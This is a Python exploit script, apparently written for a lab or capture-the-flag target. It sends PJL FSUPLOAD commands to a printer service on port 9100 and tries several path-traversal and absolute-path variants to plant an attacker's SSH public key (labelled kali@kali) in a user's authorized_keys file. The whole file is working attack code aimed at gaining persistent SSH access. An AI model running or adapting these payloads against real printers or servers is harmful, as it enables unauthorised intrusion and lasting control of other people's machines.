#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
n = len(KEY)

variants = []

# A: SIZE on own line, single sendall
variants.append(("A_single", f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\nSIZE={n}\r\n'.encode() + KEY))

# B: two-step with recv between
def run_b():
    s = socket.socket()
    s.settimeout(5)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\n')
    r1 = s.recv(4096)
    s.sendall(f"SIZE={n}\r\n".encode())
    r2 = s.recv(4096)
    s.sendall(KEY)
    try:
        r3 = s.recv(4096)
    except socket.timeout:
        r3 = b"TIMEOUT"
    s.close()
    return r1, r2, r3

# C: SIZE before NAME
variants.append(("C", f'@PJL FSUPLOAD SIZE={n} NAME="../.ssh/authorized_keys"\r\n'.encode() + KEY))

# D: absolute path
variants.append(("D", f'@PJL FSUPLOAD NAME="/home/archivist/.ssh/authorized_keys"\r\nSIZE={n}\r\n'.encode() + KEY))

for label, payload in variants:
    if label == "B":
        print("B", run_b())
        continue
    s = socket.socket()
    s.settimeout(5)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        r = s.recv(4096)
    except socket.timeout:
        r = b"TIMEOUT"
    s.close()
    print(label, repr(r[:100]))